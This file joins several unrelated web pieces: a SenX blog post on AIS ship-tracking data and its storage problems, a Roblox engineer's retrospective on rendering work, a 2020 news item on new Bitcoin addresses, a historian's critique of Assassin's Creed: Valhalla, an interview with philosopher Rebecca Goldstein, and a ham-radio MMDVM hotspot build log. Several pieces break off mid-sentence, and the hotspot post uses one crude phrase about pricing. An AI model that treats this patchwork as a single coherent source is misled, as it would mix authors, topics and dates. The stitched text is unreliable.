<p>This craze soon led to the creation of web services that offered to concentrate the data coming from individual stations and to redistribute the consolidated stream to all participants. </p>



<p>The two more popular such services are <a href="https://www.marinetraffic.com/" target="_blank" rel="noreferrer noopener">MarineTraffic</a> and <a href="https://www.aishub.net/" target="_blank" rel="noreferrer noopener">AISHub</a>. The latter is purely a community oriented service while the former has turned into a commercial provider of the data while retaining its redistribution to participating stations.</p>

<p>More recently, companies such as <a href="https://www.orbcomm.com/" target="_blank" rel="noreferrer noopener">ORBCOMM</a>, <a href="https://spire.com/" target="_blank" rel="noreferrer noopener">Spire,</a> or <a href="https://www.spacequest.com/" target="_blank" rel="noreferrer noopener">SpaceQuest</a> have launched constellations of satellites carrying a payload capable of collecting AIS data. They thus extending the available data to those coming from ships in the open sea.</p>



<p><strong>AIS data can be purchased from those companies, either as a real time stream or as historical datasets. </strong>Their offerings mainly differ by the coverage they can provide and particularities of their own APIs. But the format of the data is common since it is dictated by the AIS standard.</p>



<h2>What usage can be made of AIS data?</h2>



<p>Over the years, AIS data have been used for a growing number of types of applications. The first uses were those for which AIS was invented, the safety of ships at sea. But soon after the data started being collected and consolidated by community websites, uses not at sea started booming.</p>



<p>There are far too many uses of AIS data today to endeavor into naming them all. But we can list a few such as <a href="https://www.e-odyn.com/" target="_blank" rel="noreferrer noopener">e-ODyn</a> computing oceanic currents, <a href="https://www.quiet-oceans.com/" target="_blank" rel="noreferrer noopener">Quiet Oceans</a> forecasting ocean noise, or <a href="https://www.kpler.com/" target="_blank" rel="noreferrer noopener">Kpler</a> providing energy market intelligence.</p>



<h2>What is a typical pipeline around AIS data?</h2>



<p>The provider or pool or providers you have selected will make their AIS data available to you via a real-time feed and/or sets of downloadable files.  Your first task will be to listen to those feeds and retrieve those files. Then immediately you will need to start storing those data to start building your AIS trove.</p>



<p>This storage layer will need to be constructed with usability in mind. It means that the data must be accessible by the applications you intend to build.</p>



<p>Your real-time feed may need to be connected to a stream processing engine for on-the-fly analysis and decision.</p>



<p>And lastly, your historical datasets will need to be available for large scale batch processing, whether for detecting specific situations in the past, creating <a href="https://help.marinetraffic.com/hc/en-us/articles/204802167-Display-Density-Maps-on-the-Live-Map" target="_blank" rel="noreferrer noopener">custom visualizations</a>, or determining which ships went where in order to gather intelligence from past voyages.</p>



<h2>What are the challenges of working with AIS data?</h2>



<p>Right after connecting to your first AIS feed and getting the first few files, <strong>you may realize that these data may quickly prove more difficult to work with than what you may have expected.</strong></p>



<p>Your choice of database fills rapidly. The developers are demanding more performance. This leads to the creating of more and more indices which in turn increases the rate at which your disk fill.</p>



<p>The way your applications need to access data usually also evolve rapidly. You built your system with requirements for fetching data from a bounding box, but you now get requests for identifying specific types of ships which went through important trade routes such as the Panama and Suez canals over the course of the <a href="https://blog.senx.io/the-covid-19-pandemic-and-the-art-of-geo-time-series/" target="_blank" rel="noreferrer noopener">COVID-19 lockdown</a>, or find how ships called in various world ports over an extended period of time. </p>



<p>New uses of the data you had not planned when you first designed your system and which now occupy your teams more than you had expected and put your cloud bills through the roof as you need more and more power to mitigate bad design choices.</p>



<p>Your team will quickly need to learn more than they want about spatio-temporal indexing, space-filling curves, efficient data representations. All of this so that you can use data that you pay every month.</p>



<p>This type of situation adds a lot of stress to many teams:</p>



<ul><li>product teams which cannot deliver the features they promised to their customers, </li><li>data teams which struggle to scale their databases, </li><li>and finance teams which see costs increasing all over the place with expensive data not being put to work to produce value as it was originally planned.</li></ul>



<h2>How can SenX help?</h2>



<p>You can decide that your team has the time and ability to become top notch spatio-temporal gurus. But if that is not the case or if that objective is not aligned with your business goals we think that SenX can help.</p>



<p><a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> is the creator of <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10,</a> a software suite for managing and analyzing spatio-temporal sequences we call <a href="https://blog.senx.io/tag/geo-time-series/" target="_blank" rel="noreferrer noopener">Geo Time Series</a>, and it happens that AIS data exactly fit this definition!</p>



<figure></figure>



<p>As it happens, we distribute Warp 10 as open-source so you can grab it and thank us for all the fish, putting it in the hands of your already stressed-out data teams who will surely appreciate they get an extra tool to master.</p>



<p><strong>Or you can decide to contact us to help you solve your AIS issues.</strong> </p>



<p>Over the years we have built quite an expertise in handling spatio-temporal data at scale, whether for aircraft manufacturers, offshore racing teams, or defense agencies. AIS is such a good fit for our technologies that <strong>we have created an offering dedicated to the management of those data, TrueSea.</strong></p>

<p><span>

02 Aug 2020

</span></p><p>I joined Roblox at the end of 2012 as a rendering engineer; I had just spent more than a year working on various titles from FIFA franchise after years of console game development and was becoming a bit tired of the “big game development”. My work on FIFA was as a contractor and I got an offer for a full-time position, but I also had a friend who worked at Roblox reach out and offer me to move to California and work on Roblox. I knew absolutely nothing about Roblox, but California was nice and my friend told me it would be awesome. The platform was so different (and so strange!) that I decided to take a chance - here I am, 8 years later, still working at Roblox and enjoying it. I started on my first full time job in April 2007 so at this point I’ve worked for 13 years in game development and 8 of them were at Roblox.</p>

<!--more-->

<p>My memory works in interesting ways. I remember my interview pretty well, I remember having lunch at some place in San Mateo downtown near the Roblox HQ - a few people were at lunch including Roblox CEO David Baszucki and I remember him asking many questions about my thoughts about the engines and rendering, and distinctly remember not finishing most of my lunch because I talked most of the time. However I don’t really remember what was going through my head in regards to my perception of Roblox - why did I join besides just thinking I want to do something else for a change? Who knows, but I am glad I did.</p>

<p>I don’t really understand why Roblox is so successful - you can invent all sorts of reasons in retrospect but it’s hard to validate them, and if you came to anybody back in 2012 and asked for an investment to build a platform where all games are user generated and run on a custom engine with a custom toolset and all users participate in a giant virtual economy and …, I think you’d have gotten a blank stare.</p>

<p>But I do understand that I found the perfect place for me, especially at that point in my career - I enjoy working on game technology but I never liked working on actual games, and Roblox maximizes the number of developers who can use the technology you work on while maintaining a good autonomy and a very wide range of problems you’d need to solve. It’s very hard to get bored here.</p>

<p>I think I could talk for hours about Roblox - it somehow became a huge part of my life. I was very fortunate to join at the time when I did and witness the growth of our technology and business. I am really unsure of what the future holds but it’s hard to imagine what, if anything, comes after Roblox - I certainly don’t intend to leave any time soon…</p>

<p>So I thought it might be fun to do what I’ve planned to do for a year or more now, and to go over all decently sized projects I’ve ever worked on at Roblox. This is based on resummarizing and reliving the source control history, which tells me I’ve had 2752 changes that made it to our main branch, with merge commits counting as one, so, uh, this blog might be on a larger side. Hopefully this will be fun!</p>

<p>Before we begin, I just want to conclude this by saying that I’m very grateful to the Roblox leadership for treating me well, for all the friends and colleagues I made along the way, and for the wonderful Roblox community. The reason why I still enjoy what I do is because whenever I write about a new big thing I’m working on or a small feature or even a bug fix, it’s usually met with excitement which keeps me going. Thank you all from the bottom of my heart. I don’t think I could have done it without you and I hope this continues for as long as possible despite the current trying and uncertain times.</p>



<p>Notably including half-pixel offset fixes for Direct3D9 which I guess is a rite of passage for rendering engineers. The rendering code back then was based on OGRE rendering engine, so I had to learn that, and this was also my first time using OpenGL professionally - prior to that I’ve used Direct3D 9 and proprietary console APIs, and Direct3D 10/11 as a hobby.</p>



<p>Initially added for “100 player” project, in October it evolved to render all parts and continued to be used as part renderer until the introduction of instancing in 2018. Otherwise known as “featherweight parts”. This was further optimized and deployed around November 2012. Most of this code survived to this day but evolved over time, and is still used when instancing doesn’t apply.</p>

<p>The core idea in this system was to dynamically batch meshes together, for characters this would be based on the character model hierarchy, and for everything else the grouping is spatial. This allowed us to reduce the number of draw calls, which was a big concern due to both driver overhead and inefficiencies in OGRE.</p>

<p>This would pave the way for what eventually turned out to be a complete, but gradual, rewrite of the rendering stack. The main motivation for this was always performance - what we ended up let us port to mobile (the old rendering code was nowhere near fast enough even for relatively simple scenes), and break new grounds on the number of objects we could render in a frame.</p>



<p>One of a few OGRE upgrades we’ve needed to do, this one was to get better GLES support. It was pretty painful to do those, just like any other big middleware update is. Read further to learn what happened to OGRE eventually…</p>

<p>One thing I remember from doing these is that documentation in source code makes the upgrade process that much more painful. I had scripts that changed the copyright years in headers back to whatever they were in our tree just to make merging less painful, but there was some OGRE upgrade where 70% of the changes were documentation, and this was very hard to get through.</p>

<p>The reason why these were challenging in general is that whenever we did an upgrade we had to a) merge our plentiful changes with the new code, b) gate dangerous parts of the upgrade with flags. We’ve used the same system of feature flags (we call them fast flags) since I joined Roblox which allows us to dynamically disable parts of the release based on metrics, but this requires actually isolating changes behind if statements selectively - which for OGRE was sometimes necessary as we didn’t know what the impact of some low level change in OpenGL code would be.</p>



<p>Before this we had hand-translated shaders, which started to be painful to maintain. The first version of the pipeline used hlsl2glsl and glsl-optimizer (same as Unity back in the day). We are using version 3 today, see below!</p>

<p>Since this was done at the point where we used OGRE, the compiler would take HLSL files, preprocess and translate them to optimized GLSL, and save the resulting GLSL back to disk - which would then be loaded by OGRE directly through the material definition file. Eventually we replaced this with a binary shader pack that could store GLSL code for OpenGL and shader bytecode for other APIs, but back then we shipped HLSL and GLSL source and compiled HLSL code on device!</p>



<p>Our equivalent of “Steam Hardware Survey” that went through SQL databases and coalesced various system information bits to help us understand the hardware at the time. This was during my era of obsession with F#, so it was written in F# instead of something like Python. We don’t use this anymore and don’t even have the SQL database in question!</p>

<p>We never published the resulting data, and I’m not sure how often we used it to make decisions, but it was fun to look at the number of graphics cards from various vendors or amount of RAM or resolution a typical Roblox user has.</p>



<p>Although I was hired as a rendering engineer, I had a lot of really deep low-level systems experience and as a consequence ended up engaging in both optimization work and security related work from the very beginning. I don’t do this anymore these days but I was often involved in the security work for the first 3 or 4 years. Now we fortunately have people who can do this full time and better than I could :)</p>



<p>A second part of “100 player project”, necessary to render every character in one draw call (these were really expensive for us back in the day!). A side effect included some resolution sacrifices on character items that shirt creators aren’t fond of. The new system managed the atlas texture memory, rebaking humanoids far away to smaller textures to conserve texture memory. The compositor survived with minor changes to this day, although we’re now working on a new one.</p>

<p>The compositor was built in a very configurable fashion, allowing the high level code to specify the layout to bake, and managing all the complex asynchronous processing and budgeting by itself. This allowed us to switch the composit layout completely years later for R15.</p>



<p>At the end of 2012 we were actively working on the mobile port. Since then we’ve had to do a lot of work in a lot of different parts of the engine to make data structures smaller and algorithms - faster. Of course you’re never done with optimizations so we do this to this day. Curiously, our minimum spec on iOS stayed the same since the initial launch in 2012!</p>

<p>A fun fact is that even though we started with iPad 2 as the min. spec we discussed adding support to iPad 1 after launch. At the time there were a lot of people who couldn’t play Roblox on iOS on older hardware. However the performance characteristics of those devices were just… not good enough. You could touch the screen with the finger and pan the camera, and during panning you lost 30% of a single available core to the OS processing the touch. We decided to not add support for this, and 8 years later it seems like a great decision for sure :D</p>



<p>It was very hard to use Xcode Instruments to profile frame spikes on an iPad; to try to figure out how to get our performance to a better place on mobile, I wrote some ad-hoc code to dump all internal log events to a binary stream, and a desktop UI tool in F# and WPF to visualize it. This included a Lua profiler as well that could display profiles of Lua code in a …</p></div></div>

<p>It’s been nearly three years since the Bitcoin price has reached a benchmark of over $15k and it doesn’t seem to be stopping. But, it’s not just the price of BTC that is overflowing. New Bitcoin addresses have also skyrocketed.<span>&nbsp;</span></p>
<p>On November, 18th, one week after Bitcoin broke its 15K boundary, <a href="https://twitter.com/glassnode/status/1329045245212971010?s=20">Glassnode</a>, a crypto-analysis company, tweeted an unusually high number of BTC accounts being created.<span>&nbsp;</span></p>
<blockquote>
<p dir="ltr" lang="en">In the past hour we observed the highest number of newly created addresses in the <a href="https://twitter.com/hashtag/Bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#Bitcoin</a> network since January 2018 📈</p>
<p>Chart: <a href="https://t.co/fTmoH5ezNw">https://t.co/fTmoH5ezNw</a> <a href="https://t.co/INq7sEEtoM">pic.twitter.com/INq7sEEtoM</a></p>
<p>— glassnode (@glassnode) <a href="https://twitter.com/glassnode/status/1329045245212971010?ref_src=twsrc%5Etfw">November 18, 2020</a></p></blockquote>

<p>According to Glassnode, the address per hour rate increased to almost 25,000, a rate not seen since January 2018 when BTC hit $20k.<span>&nbsp;</span></p>
<p>To put this number into perceptive, the most Bitcoin address ever created within a 24-hour period was on December 21, 2017 when nearly 600,000 popped up. Will we see this FOMO craze again if <a href="https://coincolony.net/bitcoin-technical-analysis-can-we-see-20k-again/">BTC hits $20k</a> by the end of the year?</p>
<p>We have seen a steady rise in public BTC implementation as well as business incorporation this year. This caused the price of BTC to go from $4k at the beginning of 2020 to $18k currently.<span>&nbsp;</span></p>
<p>However, universal usage is still minuscule with as much as <a href="https://www.jbs.cam.ac.uk/wp-content/uploads/2020/08/2017-04-20-global-cryptocurrency-benchmarking-study.pdf">5.8 million cryptocurrency wallets</a> active in 2017. That equates to less than .1% of the global population own crypto.<span>&nbsp;</span></p>
<p>It will be interesting to see the adoption rates increase as the BTC price continues to rise and steady at a price that most people feel comfortable enough to buy, use, and save longterm.<span>&nbsp;</span></p>

<p>We’re going to be a bit silly this week (in part because the ending of this compressed semester has left me with little time) and talk about the recently released historical action-RPG computer (and console) game, <em>Assassin’s Creed: Valhalla</em>, set in 9th century Norway and England.</p>



<p>And, as with the last time we did this, I should note that this isn’t a <em>game review</em>.  As a <strong>game</strong>, <em>AC: Valhalla</em> is perfectly serviceable and quite fun.  I don’t think it got the same amount of developer time as its predecessor, <em>Odyssey</em>, but it is also a more focused experience than <em>Odyssey</em> was, which runs to its benefit.  Everything here basically works and while I find some of the game design decisions puzzling (the largest being how long the game makes you wait <em>hours </em>before you have a full set of all three armor types and all weapon types, given that you may be getting bonuses to them in the skill tree many hours before you find <em>any at all</em>), <strong>it is overall fine.  It’s fun.</strong></p>

<p>But you aren’t here for my game reviews. You are here for me to talk about the <em>history</em> behind the game.  And normally, I would leave a product like this alone (this is only thinly historical fiction, given the crazy background plot that ties the games together).  But each <em>Assassin’s Creed</em> game includes not just meticulous recreations of historical <em>places</em> (and to be clear, I mean the physical buildings and landscapes, not the cultures or politics, but also some form of this statement:</p>



<blockquote><p>Inspired by historical events and characters, this work of fiction was designed, developed, and produced by a multicultural team of various beliefs, sexual orientations and gender identities.</p></blockquote>



<p>(yes, the odd decision to use and then not use the Oxford comma is preserved from the original).  That is <em>Valhalla’s </em>version of the statement.  <strong>That statement is making a claim about the product that follows</strong>.  Some of those claims are explicit (this is based on real history at some level) and some are implicit (our diverse team means this game was produced in a careful, sensitive way).  <strong>And those claims deserve interrogation.</strong></p>

<h2>The Nitpicks</h2>



<p>My thoughts on <em>Valhalla</em> fit into two main categories: complaints of historical accuracy that I think are largely unimportant, but fun to note, and<strong> complaints about tone and framing which I think <em>are</em> important and worth discussing</strong>.  <strong>We can start with the frivolous stuff</strong>.  If you want to skip to the meat of the analysis, you are welcome to jump right to the next section, but I know some folks like to know about this stuff, so here it is.</p>



<p><strong>First off, because it is a core area of my specialty: the weapons and armor.  </strong>The military equipment we see here is very hit-or-miss and<strong> there are honestly quite a lot of misses</strong>.  They at least have, for the most part, the relatively light design of battle axes correct, in both their two-handed and one-handed varieties.  And I can understand from a game design standpoint the decision to not give the player a one-handed sword and to instead fill that role with the more iconic one-handed axe; NPCs use one-handed swords, so it isn’t that they don’t exist, merely that our character doesn’t prefer them.  Technically, sword-and-shield and spear-and-shield are both possible, but only with a high level perk, which is pretty silly given that these were the most common non-elite fighting styles of the era by some distance.</p>



<p>But things go poorly from there.  There is a ‘flail’ type weapon, despite – <a href="https://acoup.blog/2019/06/07/collections-the-siege-of-gondor-part-v-just-flailing-about-flails/">as we’ve discussed</a>, actually – flail chain weapons being both not of this period, poorly attested in general and also not common in this part of the world in <em>any </em>period.  The large two-handed swords – the only kinds of swords the player can use – are around <em>three hundred</em> years too early and don’t really resemble their later variations either (they are much too thick and heavy, being mostly up-scaled period swords, which makes them look absurd).  And yes, there were two-handed swords in antiquity in Thrace and Illyria (the falx and rhomphaia) but this is both not that part of the world, not antiquity, and these are not those swords.  I am befuddled that, with two other two-handed weapons that fit the period (a thrusting spear and a two-handed axe) that they felt the need to include ‘greatswords.’  Also, they are carried by way of back-scabbards, which…sigh…no.</p>



<p><strong>The armor is generally a bigger ‘miss’ than the weapons.</strong>  There is a <em>lot</em> of soft ‘leather’ armor here of exactly the sort that was not used historically.  What is baffling uncommon is <em>mail</em> – especially among the Norse and Danes (there’s a bit more mail on the Saxons) –  which would have been, in this period, by far the most common metal body protection.  Pretty much all of Eivor’s warrior band ought to be wearing mail.  Instead, there is a lot of scale armor; scale was certainly used in this period in England, but it was a lot less common than mail (there are also things like brigandine armor roughly 400 years too early).  I have noticed a real trend of game developers using lots of scale armor when mail would be more correct; I wonder if it is easier for an art-team to produce the assets for it or if they think it looks cooler.  But in any event, audiences looking for a realistic sweep of ninth century equipment will not find it here.  I would say, for the more ‘exotic’ player armors, that I think the developers here missed a trick – the game sets up early that we have people from the Near East and even the Far East in the player’s clan.  I think that would set up an opportunity to have the honestly rather more varied and potentially visually interesting armors from the Near East – a lot more scale, but also Near Eastern lamellar or even Chinese-style lamellar coats.  Alas, no.</p>

Even vikings <strong>cared</strong> about their appearances!</figcaption></figure>



<p>In terms of <em>clothing</em>, it is both hit and miss, but a bit more hit than miss compared to equipment.  Some of the Norse and Danish wear is ‘hollywood barbarian’ (lots of rough fur, inexplicably low-coverage clothing in freezing climates, lots of random leather) which remains truly frustrating.  But <em>most</em> of the clothing isn’t this way.  One odd area is color: <strong>medieval clothing, contrary to what you often see in films, was <em>colorful</em>, often with lots of bold primary colors</strong> (bright reds, yellows, greens, blues).  In <em>Valhalla</em>, the developers have opted to use clothing color to signify faction (friendly Danes wear green, the Norse blue, hostile Danes red, hostile Saxons yellow) and to keep non-combatants in drab colors.  I get the design reason (they want you to pay attention to enemies, not non-combatants) but it is frustrating, apart from the monks, that this makes so many of the townsfolk drab and dull.  <strong>Still, it was very nice to see Norse and Danes in bright primary colors, often with lovely border-stitching on their clothes and lots of clear care.</strong></p>



<p>In terms of architecture, I very much like that buildings in settlements, especially high status ones, are often well built, with lots of designs and carving work in the wood.  I am less thrilled with the way churches are done: typically in plain stone with plaster; some color is often added by lighting effects through stained glass.  But these are medieval Catholic churches, they should be brightly painted and colored in the interior and in most cases – <em>especially</em> in big towns and monasteries – very well kept up.  If you want to see this done better, <strong><em>Kingdom Come: Deliverance</em> is a deeply flawed game that nevertheless does medieval town architecture and clothing quite a lot better</strong> (but maybe watch a Let’s Play; while <em>KC:D </em>is fun once it gets properly going, it’s a case where I don’t think the juice is worth the squeeze; I invested the time to get properly into the game and I don’t think it was really worth it).</p>

<h2>Diversity</h2>



<p>This isn’t really a nitpick or a substantive issue, so I am giving it its own section in between the two.  Let me be frank: <strong>I fully understand the desire of the developers to deviate from history on some of these points in order to make a more inclusive game</strong>.  These games do not market themselves as pure historical simulations, so this does not bother me; in fact I think it is broadly a positive thing that game studios are doing this (so long as they are <em>open</em> about fudging the history).  So if you were hoping for a lot of table-pounding here, you are bound to be disappointed.  Still, we’re assessing the game historically, so it seems worthwhile to point some of these things out.</p>



<p>First, on gender diversity, so far the game has built up a quiet contrast between the English, who are gender-stratified, and the Norse and Danes, who are much less so.  Saxon troopers are all male, but Danish and Norse NPCs include women.  All of the Saxon leaders I’ve met so far in the game are male, while one of the first jarls you meet in England is a woman ruling in her own name.  Saxon clothing is sharply gendered (men in pants, women in dresses), but Norse and Danish clothing generally isn’t (which is a clear design choice, since this is very much <em>not</em> true historically).  And, as with <em>AC: Odyssey</em>, if you play a female main character, absolutely no one seems to care or notice.</p>



<p>Now, on the one hand, there isn’t <em>nothing</em> to this characterization.  <a href="https://en.wikipedia.org/wiki/Shield-maiden">‘Shield-maidens’</a> do show up in the …</p></div></div>

After all, why is it even worthwhile to struggle to know Reality, to struggle after anything at all, if the self that’s motivating the struggle is ultimately nothing at all?</em>'</p><p><img src="https://static.s123-cdn.com/uploads/2029468/2000_5fb4f9aa5c205.jpg"></p><p><a href="http://www.santafe.edu/people/profile/rebecca-goldstein"><u>Rebecca Newberger Goldstein</u></a> is an American philosopher, novelist and public intellectual. She has written ten books, both fiction and nonfiction. Here she discusses the relationship between science and philosophy, the nature of philosophical progress, Gödel’s theorems, Incompleteness, Einstein, Realism and postmodernism, Gödel and Wittgenstein, Spinoza, Spinoza and his appeal to imaginative writers, the Spinoza War, and Moby Dick.</p><p><strong>3:16:</strong> What made you become a philosopher?</p><p><strong>Rebecca Newberger Goldstein</strong> <strong>:</strong>&nbsp; I started out mostly interested in math and physics. There were problems that obsessed me in both fields—How can math be <em>a priori</em>? How can quantum mechanics be connected to a reality that is recognizably our own? I discovered, while in college, that these were actually philosophical problems. My senior year in college I went to speak to one of my professors, Sidney Morgenbesser, an amazing guy. He was the Socrates of his day. Socrates never published anything, but instead engaged in deeply probing dialogues. That was Sidney’s m.o. as well. Over the course of several long conversations Sidney convinced me that I was a philosopher, rather than a scientist. His clinching argument was that scientists are like the bourgeoisie, never questioning the system, whereas philosophers were like socialists, always examining the system critically: even if it seemed to be working, <em>ought</em> it to be working? That argument struck home. I basically applied to graduate school in philosophy on the strength of Sidney’s metaphor.&nbsp;</p><p><img src="https://static.s123-cdn.com/uploads/2029468/2000_5fb4ed28d1e2b.png"></p><p><strong>3:16:</strong> In your book <u>‘<a href="http://www.amazon.co.uk/gp/product/B00KEW8KC4/ref=dbs_a_def_rwt_hsch_vapi_tkin_p1_i1">Plato at the Googleplex</a>’ y</u>ou have Plato brought into our century to discuss philosophy with our contemporaries. So first, can you say what you take philosophy to be and why you think it hasn’t gone away and isn’t going away soon?</p><p><strong>RNG:</strong> I think that philosophy is the systematic and rigorous investigation of one of the deepest urges that we humans have, which is the urge to get our bearings in the most general sense possible. In particular, (1) We want to know where we are. What is the nature of this universe in which we find ourselves? What fundamentally different kinds of things, belonging to different ontological categories, are there, and how do they operate? 2. We want to know our own place in the universe, whether we’re made of the same stuff, are a special category of being, and whether the universe itself has any attitudes towards us. 3. We want to know what we are meant to do with our lives. We want to know what it is to live a life worthy for a human to live, a good life.&nbsp;</p><p>The first two questions are ontological, the third is normative. Science, as it eventually developed, has the lead role in answering the ontological questions, but science is often pushed on by philosophy, in its critical probing role. And the more subtle the science becomes, the bigger the role for philosophy, since it falls to philosophy’s special techniques to figure out what is and isn’t entailed by the science. For example, what changes are we required to make to our concept of time in light of Relativity Theory? And as far as the normative questions go, there the ball falls squarely in philosophy’s court, though it’s sometimes advancements in science and technology that generate the balls, that is, new normative questions.&nbsp;</p><p>Consider the normative questions generated by advances in AI, or the question of what obligations we have to future generations, given the threat of climate change. As long as science and technology advance, philosophers will have new questions to work on.</p><p><strong>3:16:</strong>&nbsp; You place Plato in rooms having philosophical debates with all sorts of people but you never have him decisively concluding a debate or argument. For those hostile to philosophy this might be a hostage to fortune – it suggests that philosophy can’t decide anything and actually we would be better off listening to scientists, historians and novelists. Why should we heed the philosopher in our time if not even Plato can answer its questions? What do you say to those physicists who say philosophy is just pointless and has been supplanted by – well, in their case – physics?&nbsp;</p><p><strong>RNG:</strong> When it comes to ontology, I would argue that it’s science that plays the leading role. But I’d have to offer a philosophical argument to support that conclusion. I'd first have to both differentiate what is essential to science, how it differs from other fields of inquiry, including philosophy, and I’d have to argue for scientific realism, that is argue that science is in the business of ontology. Both of those are conclusions that can’t be empirically established, i.e. they are philosophical. So one can’t even make the case for science, ontologically speaking, without engaging in philosophy. And as far as the normative questions go, we are entirely in the philosophical sphere. And here I do think philosophy has offered us answers, answers which have as fundamentally changed our lives, and for the better, as the technological advances that science has given us.&nbsp;</p><p>As just one example, consider the idea of human rights. One of my points in my having Plato engage in those philosophical dialogues in which it’s not he who supplies the answer, but instead he is rather surprised by being philosophically instructed by some “regular” people, was to demonstrate the progress we’ve made since Plato, progress that has been disseminated and seeped into the points of view of non-philosophers. In the first dialogue a rather down-to-earth character, a media escort, explains to Plato in very commonsensical terms why slavery is wrong. Plato had argued that it’s wrong for Greeks to enslave other Greeks, which was an advance over the norm taken for granted by his society, but he never universalized the conclusion. Nor did Aristotle, who argued that some people are naturally suited to be slaves. So if I don’t have Plato having all the answers it’s often to show progress made in the millennia since he lived, or to show that our new conditions, many of them created by scientific and technological advances, generate new philosophical problems--in other words to show that philosophy will never go away. My showing Plato to be often instructed and/or stumped is meant to challenge the view that philosophy remains static.</p><p><strong>3:16:</strong>&nbsp; So this leads to one of the issues you raise in the book - the notion of philosophical progress. So what do you take to be the progress philosophy has made since Plato and why is it invisible to many, unlike science?&nbsp;</p><p><strong>RNG:</strong> Philosophical advances in epistemology and in ethics profoundly shape our points of view. We don’t see them precisely because we see with them. It’s like the fish who responds to the question “How’s the water today?” with “Water? What’s water?” When people hold the view, for example, that science has discovered that simultaneity is not absolute, as counter-intuitive as that seems, or that chattel slavery is an abomination, which once also had seemed counter-intuitive, they don’t realize the laborious philosophical reasoning that had laid the groundwork for their views. It takes philosophical work to claim that science can correct our fundamental views of the way the world is. It takes philosophical work to claim that we can discover, without consulting any holy books (that in fact sanction slavery), truths about the way humans can and can’t be treated. Philosophy is committed to the view that we can use human reason to come to ethical conclusions, overcoming biases, tradition, and religious authority. Just the other week the Pope gave his approval to civil unions for gay people. That is the slow progress of the philosophical idea of human rights working its way out. You could even consider such changes in ethical attitudes, eventually making their way even to the Vatican, as philosophy’s own technological products, the practical application of philosophical conclusions, analogous to the technological goodies that have come from science. In fact, you can even regard science itself as one of philosophy’s technological products, the practical application of certain epistemological conclusions.&nbsp;</p><p><img src="https://static.s123-cdn.com/uploads/2029468/2000_5fb4edb79cae4.png"></p><p><strong>3:16:</strong>&nbsp; You’ve written about <u><em>Gödel</em></u><a href="http://www.bookdepository.com/Incompleteness-Rebecca-Goldstein/9780393327601?ref=grid-view&amp;qid=1605692840648&amp;sr=1-1"><u><em>’s incompleteness theorems</em></u></a>. …</p></div></div></div></div></div></div></section></div></div></div></div>

    <p>If you’re reading this post on my new LoneStar Electronics MMDVM hotspot, then you no doubt decided to explore the option of buiding one yourself after noting the price of some of the commercially available hotspots. For example the Zumspot form Ham Radio Outlet retails between $150 - $160, and that’s not including a case to safeguard it. And let’s not forget about BridgeCom Systems who absolutely rape you on the price of their SkyBridge Hotspot; $299 is rip off.</p>
<p>So, “What did you build and what did it cost?” you ask. I built a simple small form MMDVM hotspot using the LoneStar MMDVM Simplex Board. Combined cost for the build is $140, and if you want the OLED screen you can add on another $10 for a total $150. Now before you start complaining there are Jumbospots on eBay for $75, let me remind you that those are made from questionable components. If you want to purchase one of these, fine but don’t be surprised if it underperforms or completely dies on you. That’s the price you pay for not paying full price.</p>
<h2 id="background">Background</h2>
<p>Before we dive into the build, allow me give you a little background of my motivations behind this project and my requirements. To begin with, I believe the cost of commercially available hotspots is too high provided the quality of components used. Second, I didn’t like any of the available options on the market.</p>
<p>I think the OLED screen that’s attached to most MMDVM boards is ridiculously small. During my research on hotspot cases, I came across the line of cases from C4Labs with either 2.4” or 3.5” Nextion screens. This intrigued me because they are so much bigger than the OLED screens attached to the MMDVM boards. Bigger is better right?! Well… it turns out the screen is just a novelty and doesn’t provide any functionally beyond displaying which room/reflector/talkgroup you’re connected to and the callsign of the current person speaking. My Yaseu FT3D already does this for me. I asked around and couldn’t find anyone who thought it was a must have feature. Knowing this, I decided that I didn’t need either the OLED or Nextion screen. However, I still want the option to attach a screen to my hotspot should I change my mind in the future.</p>
<p>One of the biggest complaints against hotspots is the accusation that it isn’t real ham radio because most users operate them within ten feet of themselves. Personally I don’t care what you’re opinion on this topic is, the fact of the mater is that I’m going to be within ten feet of my hotspot when I employ it. With such limited distances between the users and their hotspot, I challenge the need for SMA connectors attached to the MMDVM board. The connectors are just soldered onto the board with nothing more to secure them in place. Luckily the MMDVM board I want to use comes with a ceramic antenna surface mounted onto the board. No need for me to worry about breaking the solder joints on a SMA connector.</p>
<p>With that out of the way, let’s move onto the parts utilized for this build.</p>
<h2 id="parts-list">Parts List</h2>

        </figcaption>
</figure>

<p>The most essential component of a hotspot is the MMDVM board. I want the most superior performance and quality for my hotspot, so I don’t want to compromise by buying a cheap MMDVM board. The LoneStar MMDVM Simplex Board, designed by N5BOC David Dennis, is considerable more expensive than other MMDVM boards, however it’s constructed of higher-quality components and has the following features:</p>
<ul>
<li>It has its own dedicated 3.3V regulator and does not pull voltage off of the noisy Raspberry Pi 3.3V line like all other simplex board do.</li>
<li>The board is a four layer PCB with large ground planes for 3.3V and GND sandwiched in the middle of the PCB. This acts as one very large decoupling cap the size of the entire board. Also this isolates signals between top side and bottom side.</li>
<li>All of the Analog RF signals are on the top side only and the high harmonic digital signals are all kept isolated on the bottom side. Making this board much more stable. It should also make it more sensitive on receive.</li>
</ul>
<h3 id="c4labs-jrz-1s-case">C4Labs JRZ-1S Case</h3>

            <p>C4Labs JRZ-1S Case</p>
        </figcaption>
</figure>

<p>I like this case; it’s modest yet does the job very well once it’s completely together. As an added touch of class, I went with the wood inlays. I also sanded the sides of the case with 400 grit sandpaper to give it that frosted glass look. I appreciate how it turned out. The actual case is engineered very well with the components fitting in securely inside. Interestingly enough one layer of the case does include holes drilled in it to support the prongs of an SMA connector. It’s a thoughtful touch, but I’m keenly uninterested in trying to find out how well they work.</p>
<h3 id="raspberry-pi-zero-wh">Raspberry Pi Zero WH</h3>

</figure>

<p>Nothing extremely exceptional about this other than I purchased it from Adafruit. I went with the Zero WH instead of the Zero W, because I don’t know how to solder very well and didn’t want to ruin the thing. One of these days I need to force myself to learn and become better.</p>
<h2 id="the-finished-build">The Finished Build</h2>

<p>Here’s the finished hotspot. If you look in the top right-hand corner above the heatsink, you’ll recognize the ceramic antenna. With the hotspot located in my basement, I’m nevertheless able to connect to it will my Yaesu FT3D running 300 mW. Should I want to ever want to attach a screen I can because there are connections present for the Nextion and OLED displays. The only gripe I have remains the location of the micro-USB port on the Pi Zero. If you couldn’t determine from the photo the case is upside down. Well, I can’t do anything about that so, I’ll have to live with it. Overall I’m impressed with the build quality of the hotspot and look forward to using it for years to come.</p>

